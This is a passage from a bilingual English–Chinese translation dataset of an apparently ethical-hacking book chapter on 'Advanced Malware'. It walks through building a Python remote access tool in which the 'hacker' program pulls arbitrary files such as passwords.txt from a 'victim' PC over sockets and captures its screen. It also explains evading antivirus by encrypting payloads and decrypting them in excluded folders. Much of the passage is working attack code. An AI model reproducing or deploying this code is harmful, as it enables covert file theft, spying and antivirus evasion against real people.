- en: '*Chapter 7*: Advanced Malware'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第七章*：高级恶意软件'
- en: 'In the previous chapter, we learned how to create a very simple malware that
    executes *Windows* commands sent by a hacker and returns the results of these
    commands. This program is very limited in terms of its ability to just execute
    commands. Ideally, for a **Remote Access Tool**, we would want to have much more
    advanced functionalities than this. This chapter will give you a basic idea of
    what more advanced functionalities you can write inside your malware program.
    We will cover the following topics in this chapter:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章中，我们学习了如何创建一个非常简单的恶意软件，该软件执行黑客发送的*Windows*命令，并返回这些命令的结果。这个程序在仅执行命令方面非常有限。理想情况下，**远程访问工具**应该具有比这更为高级的功能。本章将给你一个基本的概念，了解你可以在恶意软件程序中编写的更高级功能。我们将在本章中讨论以下内容：
- en: File transfer
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 文件传输
- en: Stealing Wi-Fi credentials
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 偷窃Wi-Fi凭证
- en: Taking screenshots
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 截取屏幕截图
- en: Building a keylogger file transfer
  id: totrans-5
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 构建一个键盘记录器文件传输
- en: We have already learned how to send and receive very basic data in the program
    we developed in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
    *Malware Development*. In this chapter, we will try to send and receive files
    from one PC to another, first from the victim's PC to the hacker's PC, and then
    from the hacker's to the victim's PC. This will give us access to any sensitive
    files present on the victim's PC. For example, let's say that the victim has stored
    their passwords in a file present on their PC (which is a very bad idea; never
    store your passwords in a plain text file on your PC); then we can simply read
    the contents of the file and send it to the hacker. Let's see how this works.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经在[*第六章*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)《恶意软件开发》中学习了如何在程序中发送和接收非常基础的数据。在本章中，我们将尝试从一台PC到另一台PC发送和接收文件，首先是从受害者的PC到黑客的PC，然后从黑客的PC到受害者的PC。这将让我们访问受害者PC上的任何敏感文件。例如，假设受害者将他们的密码存储在PC上的一个文件中（这是一个非常糟糕的主意；切勿将密码以明文形式存储在PC上）；那么我们可以简单地读取该文件的内容并将其发送给黑客。让我们看看这个过程是如何工作的。
- en: Downloading the victim file to the hacker
  id: totrans-7
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 将受害者的文件下载到黑客的电脑
- en: 'Here, we will modify the program we developed in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
    *Malware Development*, where we ran Windows commands to add functionality for
    file transfer (see the *Creating malware* section). First, we will add a download
    functionality to send any file from the victim''s PC to the hacker''s PC and later
    in the other direction. To send files over the network, we need to perform certain
    steps. These are listed next:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们将修改在[*第六章*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)《恶意软件开发》中开发的程序，我们运行Windows命令来增加文件传输功能（请参见*创建恶意软件*部分）。首先，我们将添加一个下载功能，将任何文件从受害者的PC发送到黑客的PC，之后再从黑客的PC发送到受害者的PC。为了通过网络发送文件，我们需要执行一些特定的步骤。接下来列出了这些步骤：
- en: Check whether the file exists. If it does not, throw an error.
  id: totrans-9
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 检查文件是否存在。如果不存在，则抛出错误。
- en: If the file exists, read the contents of the file into your program.
  id: totrans-10
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果文件存在，将文件内容读取到程序中。
- en: Once the contents are read, add a special marker to the end of the data to signify
    file transfer completion.
  id: totrans-11
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦内容被读取，将一个特殊标记添加到数据的末尾，以表示文件传输完成。
- en: Send the data bytes over the network.
  id: totrans-12
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过网络发送数据字节。
- en: On the receiving side, receive the bytes until you match the marker.
  id: totrans-13
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在接收端，接收字节直到匹配标记。
- en: Once the marker is identified, remove the marker from the received bytes.
  id: totrans-14
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦标记被识别，移除接收到字节中的标记。
- en: Write the rest of the bytes onto the filesystem of your PC.
  id: totrans-15
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将剩余的字节写入到你电脑的文件系统中。
- en: Close the connection.
  id: totrans-16
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 关闭连接。
- en: Don't worry if you don't understand these steps straight away. We will go through
    these steps one by one. You can add this functionality to the program we already
    developed in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130), *Malware
    Development*. To make things simpler, use the hacker and victim programs we developed
    in the *Creating malware* section from [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
    *Malware Development*. Create a new project in the Kali and Windows PCs for a
    hacker and server, and this time call it *advanced_server* and *advanced_victim*.
    Copy the code from previous chapters into the respective projects so that you
    have the code base to build on.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你立刻不理解这些步骤也没关系。我们将逐步讲解这些步骤。你可以将这个功能添加到我们在[*第6章*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)《恶意软件开发》中已经开发的程序中。为了简化操作，使用我们在[*第6章*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)《恶意软件开发》中创建的黑客和受害者程序。在Kali和Windows
    PC上分别为黑客和服务器创建一个新项目，并将其命名为*advanced_server*和*advanced_victim*。将前几章的代码复制到相应的项目中，这样你就有了可以继续开发的代码基础。
- en: Let's start by first defining how we will send the file from the victim to the
    hacker. Let's say there is a file present on the victim's PC with the victim's
    passwords stored. This is used as an example. Theoretically, you can download
    any file from the victim's PC that you want to.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们首先定义如何将文件从受害者发送到黑客。假设在受害者的PC上有一个存储受害者密码的文件。这个文件是作为示例使用的。从理论上讲，你可以从受害者的PC下载任何你想要的文件。
- en: 'Let''s say the filename is **passwords.txt**. Let''s take a look at the strategy
    in graphic form to understand how this will work in practice:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 假设文件名是**passwords.txt**。让我们通过图形化的策略来看一下，这样可以帮助我们理解这个过程如何在实践中工作：
- en: '![Figure 7.1 – Sending a file to the hacker'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: '![图7.1 – 向黑客发送文件'
- en: '](image/B14788_07_01.jpg)'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_07_01.jpg)'
- en: Figure 7.1 – Sending a file to the hacker
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 图7.1 – 向黑客发送文件
- en: 'First, we need to send the victim''s filename from the hacker to the victim.
    We have already seen how we can send text data over the network when we learned
    about sockets in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
    *Malware Development*, so this process is fairly straightforward. On the hacker
    program, we will design the following strategy to send the filename that we need
    to download from the victim. Our command will look something like this, **download
    passwords.txt**, if we want to download a file named **passwords.txt**. So, on
    the hacker program, we will check whether the hacker command starts with **download**
    to create a case for this condition. Let''s take a look at the following code.
    In our main loop, where we check for different conditions, we will insert the
    following check:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们需要将受害者的文件名从黑客发送到受害者。我们已经在[*第6章*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)《恶意软件开发》中学到了如何通过网络发送文本数据，因此这个过程相对直接。在黑客程序中，我们将设计以下策略，发送需要从受害者下载的文件名。如果我们想下载一个名为**passwords.txt**的文件，我们的命令看起来可能是**download
    passwords.txt**。因此，在黑客程序中，我们将检查黑客命令是否以**download**开头，并为此条件创建一个案例。我们来看一下以下代码。在我们的主循环中，我们检查不同条件的地方，将插入以下检查：
- en: 'elif command.startswith("download"):'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 'elif command.startswith("download"):'
- en: hacker_socket.send(command.encode())
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(command.encode())
- en: exist = hacker_socket.recv(1024)
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: exist = hacker_socket.recv(1024)
- en: 'The first line checks whether the hacker''s command is to download the file
    from the victim. If it is, we will send the command to the victim and the victim
    will reply whether the file exists. Depending on the reply, further action may
    be taken. If the file exists, we will handle the case for downloading the file,
    otherwise we will simply exit the program safely. Now, let''s stop on the hacker
    program for a moment and go to the victim program. On the victim side, we need
    to add a similar case for checking whether the command is **download**. If it
    is, we will retrieve the filename from the received message and check whether
    the file exists. Go to the victim program and write the following check in the
    main loop:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 第一行检查黑客的命令是否是从受害者那里下载文件。如果是，我们将命令发送给受害者，受害者将回复文件是否存在。根据回复，可以采取进一步的行动。如果文件存在，我们将处理下载文件的情况，否则我们将安全退出程序。现在，让我们稍微停留在黑客程序上，转到受害者程序。在受害者端，我们需要添加一个类似的检查，判断命令是否为**download**。如果是，我们将从接收到的消息中提取文件名，并检查文件是否存在。进入受害者程序，并在主循环中编写以下检查：
- en: 'elif hacker_command.startswith("download"):'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 'elif hacker_command.startswith("download"):'
- en: file_to_download = hacker_command.strip("download ")
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: file_to_download = hacker_command.strip("download ")
- en: 'if os.path.exists(file_to_download):'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 'if os.path.exists(file_to_download):'
- en: exists = "yes"
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: exists = "yes"
- en: victim_socket.send(exists.encode())
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.send(exists.encode())
- en: 'else:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: exists = "no"
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: exists = "no"
- en: victim_socket.send(exists.encode())
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.send(exists.encode())
- en: continue
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: continue
- en: Here, we are receiving the command and checking the type of command. Once we
    receive the command, which has a download string inside it, we can strip the download
    part from the command to retrieve the actual filename we are interested in. On
    the third line in the previous code, we check whether the file exists. If it does,
    we send back **yes**, otherwise we send back **no**. Remember that in the hacker
    program, we are waiting to receive this reply in the **exists** variable. Note
    that we haven't sent any file data yet. We are just creating the outer loop to
    properly handle the sending and receiving of data. The read part of the file will
    be handled in the first **if** statement in the previous code. Now we will need
    to read the file.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们接收命令并检查命令的类型。一旦收到包含下载字符串的命令，我们可以从命令中剥离出下载部分，以检索我们感兴趣的实际文件名。在前面代码的第三行中，我们检查文件是否存在。如果存在，我们会回复**yes**，否则回复**no**。记住，在黑客程序中，我们在等待接收**exists**变量的这个回复。请注意，我们还没有发送任何文件数据。我们只是创建了外部循环来正确处理数据的发送和接收。文件的读取部分将在前面代码的第一个**if**语句中处理。现在，我们需要读取文件。
- en: 'Let''s take a look at the code that follows, which reads the file from the
    victim''s machine and then sends the file back to the hacker:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，让我们看看下面的代码，它从受害者的机器读取文件并将其发送回黑客：
- en: 'with open(file_to_download, "rb") as file:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 'with open(file_to_download, "rb") as file:'
- en: chunk = file.read(CHUNK_SIZE)
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: chunk = file.read(CHUNK_SIZE)
- en: 'while len(chunk) > 0:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 'while len(chunk) > 0:'
- en: victim_socket.send(chunk)
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: victim_socket.send(chunk)
- en: chunk = file.read(CHUNK_SIZE)
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: chunk = file.read(CHUNK_SIZE)
- en: '# This will run till the end of file.'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: '# 这将一直运行直到文件结束。'
- en: once the file is complete, we need to send the marker.                            victim_socket.send(eof_identifier.encode())
  id: totrans-45
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 一旦文件传输完成，我们需要发送标识符。                            victim_socket.send(eof_identifier.encode())
- en: print("File sent successfully")
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: print("文件成功发送")
- en: Let's break down the code we just saw. The file line is a command to open and
    read the file in binary format. Even though it is a text file, it is a good idea
    to read files in binary format if you want to transfer them over the network since
    the file type could be anything in practical cases. Then we read a chunk of bytes,
    and we define **CHUNK_SIZE = 2048** at the top of the file. After we have read
    the first chunk, we check whether the file has more bytes. If it has, we send
    them iteratively over the network by using the **while** loop until we read the
    end of the file. This loop will stop when there is no further chunk to read from
    the file. Once we have sent the complete file over the network to the hacker,
    we need to send the identifier marker for the hacker to know that they can stop
    reading further. To do that, we send **eof_identifier**, which has the following
    value, **eof_identifier = "<END_OF_FILE_IDENTIFIER>"**. The hacker will use this
    identifier to know that the incoming data is complete.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来分析一下刚才看到的代码。文件行是一个命令，用于以二进制格式打开并读取文件。尽管它是一个文本文件，但如果你想通过网络传输文件，读取二进制格式的文件是个好主意，因为在实际情况下，文件类型可能是任何格式。接着，我们读取一块字节，并且在文件顶部定义了**CHUNK_SIZE
    = 2048**。在读取第一块字节后，我们检查文件是否还有更多字节。如果有，我们就通过使用**while**循环迭代地将其发送到网络，直到读取到文件的末尾。这个循环将在没有更多字节可读时停止。一旦我们将完整的文件通过网络发送到黑客那里，我们需要发送标识符，以便黑客知道他们可以停止继续读取。为此，我们发送**eof_identifier**，其值为**eof_identifier
    = "<END_OF_FILE_IDENTIFIER>"**。黑客将使用这个标识符来确认接收到的数据已经完整。
- en: 'Next, we need to receive this data in the hacker program. To do this, go to
    the hacker program and check the value received for the **exists** variable. If
    the reply from the victim is **yes**, this means that the file exists on the victim''s
    machine and we can start downloading it. Note that we just developed the program
    to send data, and now here we will receive the same data. The received data will
    be in the form of bytes, and we will write these bytes onto our hacker''s PC to
    generate the same file as on the victim''s PC. Let''s take a look at the following
    code:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们需要在黑客程序中接收这些数据。为此，进入黑客程序并检查接收到的**exists**变量的值。如果受害者的回复是**yes**，这意味着文件在受害者的机器上存在，我们可以开始下载文件。请注意，我们刚刚开发了一个发送数据的程序，现在我们将在这里接收相同的数据。接收到的数据将是字节形式，我们将把这些字节写入到黑客的PC上，以生成与受害者PC上相同的文件。让我们看看以下代码：
- en: 'if exist.decode() == "yes":'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 'if exist.decode() == "yes":'
- en: print("file exists")
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: print("文件已存在")
- en: '# receive file here'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: '# 在此接收文件'
- en: file_name = command.strip("download ")
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: file_name = command.strip("download ")
- en: 'with open(file_name, "wb") as file:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 'with open(file_name, "wb") as file:'
- en: print("Downloading file")
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: print("正在下载文件")
- en: 'while True:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 'while True:'
- en: chunk = hacker_socket.recv(CHUNK_SIZE)
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: chunk = hacker_socket.recv(CHUNK_SIZE)
- en: file.write(chunk)
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: file.write(chunk)
- en: 'if chunk.endswith(eof_identifier.encode()):'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 'if chunk.endswith(eof_identifier.encode()):'
- en: chunk = chunk[:-len(eof_identifier)]
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: chunk = chunk[:-len(eof_identifier)]
- en: file.write(chunk)
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: file.write(chunk)
- en: break
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: break
- en: print("Successfully downloaded, ", file_name)
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: print("下载成功，", file_name)
- en: If the file exists, we create a new file with the same name as **file_name**.
    Note that we create the file in **wb** or write binary mode, so that we can download
    any type of file. Once we create a file, we need to write the received file content
    that we receive from the victim. We define the **CHUNK_SIZE** variable equal to
    the same size as we defined in the victim while sending the data, and then we
    start receiving data continuously and write it to the disk until the end, which
    is identified by the marker. You need to define the exact same **eof_identifier**
    variable as you defined in the victim, otherwise the program will not work. Once
    we reach the identifier, we remove the identifier, write the remaining bytes to
    the disk, and exit the loop. Finally, we can print the statement indicating that
    we have received all the data. Now that our program is complete, using this program,
    we can download data from the victim to the hacker.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 如果文件存在，我们将创建一个与**file_name**同名的新文件。请注意，我们以**wb**（写入二进制模式）创建文件，这样我们就可以下载任何类型的文件。创建文件后，我们需要写入从受害者处接收到的文件内容。我们定义**CHUNK_SIZE**变量的大小与受害者在发送数据时定义的大小相同，然后我们开始连续接收数据并写入磁盘，直到接收到文件末尾的标识符。你需要定义与受害者相同的**eof_identifier**变量，否则程序将无法正常工作。一旦达到标识符，我们就去除标识符，写入剩余的字节到磁盘，并退出循环。最后，我们可以打印出一条语句，指示我们已接收到所有数据。现在我们的程序完成了，使用这个程序，我们可以从受害者下载数据到黑客机器。
- en: 'The complete code for the hacker is given here:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 黑客的完整代码如下：
- en: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py)'
- en: )
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: )
- en: 'Similarly, the complete code for the victim for sending the file to the hacker
    is given here:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，发送文件给黑客的受害者完整代码如下：
- en: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py)'
- en: )
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: )
- en: Now, let's try running this program. First, run the hacker and then the victim
    program.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们尝试运行这个程序。首先运行黑客程序，然后是受害者程序。
- en: 'Create a file in the victim''s PC with the name **passwords.txt** and write
    some random passwords into it:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 在受害者的 PC 上创建一个名为**passwords.txt**的文件，并写入一些随机密码：
- en: '![Figure 7.2 – Passwords file on the victim''s PC'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.2 – 受害者 PC 上的密码文件'
- en: '](image/B14788_07_02.jpg)'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_07_02.jpg)'
- en: Figure 7.2 – Passwords file on the victim's PC
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.2 – 受害者 PC 上的密码文件
- en: 'Next, write the following command in the hacker program: **download passwords.txt**.'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，在黑客程序中输入以下命令：**download passwords.txt**。
- en: 'Now, once the program is run, you will see the exact same file on the hacker''s
    PC:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，运行程序后，你将在黑客的 PC 上看到完全相同的文件：
- en: '![Figure 7.3 – Downloading a file from the victim'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.3 – 从受害者处下载文件'
- en: '](image/B14788_07_03.jpg)'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_07_03.jpg)'
- en: Figure 7.3 – Downloading a file from the victim
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.3 – 从受害者处下载文件
- en: 'You will see that a file with the name **passwords.txt** has been created on
    the Kali machine and if you open this file, it will have the same contents as
    the one located on the victim''s PC:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 你将看到在 Kali 机器上创建了一个名为**passwords.txt**的文件，如果你打开这个文件，它将与受害者 PC 上的文件内容相同：
- en: '![Figure 7.4 – passwords.txt file on the hacker''s machine'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.4 – 黑客机器上的 passwords.txt 文件'
- en: '](image/B14788_07_04.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_07_04.jpg)'
- en: Figure 7.4 – passwords.txt file on the hacker's machine
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.4 – 黑客机器上的 passwords.txt 文件
- en: If you open the file, you will see the contents of the file. You can try downloading
    other types of files as well, such as images, and this will also work.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你打开文件，你将看到文件的内容。你还可以尝试下载其他类型的文件，如图片，程序同样适用。
- en: Uploading files to the victim
  id: totrans-85
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 上传文件到受害者
- en: The process of uploading files to the victim is very similar, except that the
    data now will go in the opposite direction. Using this method, you can potentially
    upload other advanced malware to the victim's machine and run it. However, the
    malware can't be uploaded directly. The **Intrusion Detection System** (**IDS**)
    will detect it. If we try to upload it directly, some modifications will be required
    to upload other malware using this method. First, you need to encrypt the malware
    bytes and send the encrypted data over the network. Let's try to understand how
    the IDS works. Antiviruses have a huge database of malware file signatures. A
    signature, in the simplest terms, is a sequence of bytes from a malware program.
    So, if a signature of a file matches with the database of the antivirus program,
    the antivirus program will know that the file is malware. In order to beat it,
    we need to encrypt the data. Once the malware is encrypted, its sequence of bytes
    changes and the antivirus program will think that it is not malware. However,
    we still need to decrypt these files to make them run properly. Let's say we send
    encrypted malware over the network to the victim using the method we just developed.
    The encrypted file will be sent to the victim and when we try to decrypt it to
    retrieve the original file, the antivirus program will detect it immediately and
    block this file. This doesn't sound like very good news. However, we can beat
    this detection if we decrypt the file in a folder that is added to the antivirus
    exception folder. This antivirus program will not scan this folder and we can
    successfully decrypt the malware and run it. There is one small caveat here, however.
    To add a folder to antivirus exceptions, we require administrator privileges.
    We will see later in [*Chapter 8*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160),
    *Post Exploitation*, how we can get administrator privileges. The code for uploading
    files to the hacker will be very similar, so it will be redundant to discuss it
    here again. I have already discussed how we can send it over the network. In the
    next section, we will learn how we can steal Wi-Fi passwords stored on the PC.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 上传文件到受害者的过程非常相似，只是数据现在会反向传输。使用这种方法，你可以将其他高级恶意软件上传到受害者的机器并运行它。然而，恶意软件不能直接上传。**入侵检测系统**（**IDS**）会检测到它。如果我们尝试直接上传，需要对其他恶意软件进行一些修改才能使用这种方法上传。首先，你需要加密恶意软件的字节并通过网络发送加密数据。让我们尝试理解IDS是如何工作的。防病毒软件有一个庞大的恶意文件签名数据库。签名，简单来说，是来自恶意程序的一串字节。因此，如果文件的签名与防病毒程序的数据库匹配，防病毒程序就会知道该文件是恶意软件。为了绕过这一点，我们需要加密数据。一旦恶意软件被加密，它的字节序列就会发生变化，防病毒程序会认为它不是恶意软件。然而，我们仍然需要解密这些文件才能正常运行。假设我们使用刚才开发的方法将加密的恶意软件通过网络发送给受害者。加密文件会被发送到受害者，当我们尝试解密它以恢复原文件时，防病毒程序会立即检测到并阻止该文件。这听起来似乎不是个好消息。然而，如果我们在一个已被添加到防病毒例外文件夹的文件夹中解密文件，我们就能绕过这种检测。这个防病毒程序不会扫描这个文件夹，我们可以成功解密恶意软件并运行它。然而，有一个小小的警告。为了将文件夹添加到防病毒例外中，我们需要管理员权限。稍后我们将在[*第八章*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160)，“*后期利用*”中，了解如何获取管理员权限。上传文件到黑客程序的代码非常相似，因此在这里讨论就显得多余了。我已经讨论过如何通过网络发送它了。在下一部分，我们将学习如何盗取存储在电脑上的Wi-Fi密码。
- en: Taking screenshots
  id: totrans-87
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 截取屏幕截图
- en: 'You can also take screenshots of the victim''s PC using your malware. For this,
    you will need to install additional libraries. We will need a module called **pyautogui**.
    This module will help you to take a screenshot on the victim''s PC:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以使用恶意软件截取受害者电脑的屏幕截图。为此，你需要安装额外的库。我们需要一个叫做**pyautogui**的模块。这个模块可以帮助你在受害者的电脑上截取屏幕截图：
- en: 'To install it, go to your victim''s machine and write the following command
    to install it. It''s a good idea to create a virtual environment and install this
    program in the virtual environment:'
  id: totrans-89
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要安装它，请去受害者的机器并输入以下命令进行安装。最好创建一个虚拟环境，并在虚拟环境中安装这个程序：
- en: '**pip install pyautogui**'
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**pip install pyautogui**'
- en: This will install the requisite module.
  id: totrans-91
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将安装所需的模块。
- en: 'Next, we need to define the case for taking a screenshot. In the hacker program,
    create a new case and set the following condition:'
  id: totrans-92
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们需要定义截屏的情况。在黑客程序中，创建一个新情况并设置以下条件：
- en: 'if command == "screenshot":'
  id: totrans-93
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if command == "screenshot":'
- en: print("Taking screenshot")
  id: totrans-94
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print("正在截取屏幕截图")
- en: 'Similarly, on the victim program, write the same case as well:'
  id: totrans-95
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 同样，在受害者程序中，写下相同的情况：
- en: 'elif hacker_command == "screenshot":'
  id: totrans-96
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif hacker_command == "screenshot":'
- en: print("Taking screenshot")
  id: totrans-97
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print("正在截取屏幕截图")
- en: screenshot = pyautogui.screenshot()
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: screenshot = pyautogui.screenshot()
- en: screenshot.save("screenshot.png")
  id: totrans-99
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: screenshot.save("screenshot.png")
- en: print("screenshot saved")
  id: totrans-100
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print("屏幕截图已保存")
- en: This will save the screenshot on the victim's PC as **screenshot.pn**.
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将把屏幕截图保存在受害者的PC上，文件名为**screenshot.pn**。
- en: Let's run this program and see what the output looks like. On the hacker's machine,
    the output should look like this:![Figure 7.5 – Hacker program taking a screenshot
  id: totrans-102
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们运行这个程序，看看输出是什么样的。在黑客的机器上，输出应该是这样的：![图7.5 – 黑客程序截取的屏幕截图
- en: '](image/B14788_07_05.jpg)'
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B14788_07_05.jpg)'
- en: Figure 7.5 – Hacker program taking a screenshot
  id: totrans-104
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图7.5 – 黑客程序截取的屏幕截图
- en: 'The victim program looks like this:'
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 受害者程序如下所示：
- en: '![Figure 7.6 – Victim program taking a screenshot'
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图7.6 – 受害者程序截取的屏幕截图'
- en: '](image/B14788_07_06.jpg)'
  id: totrans-107
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B14788_07_06.jpg)'
- en: Figure 7.6 – Victim program taking a screenshot
  id: totrans-108
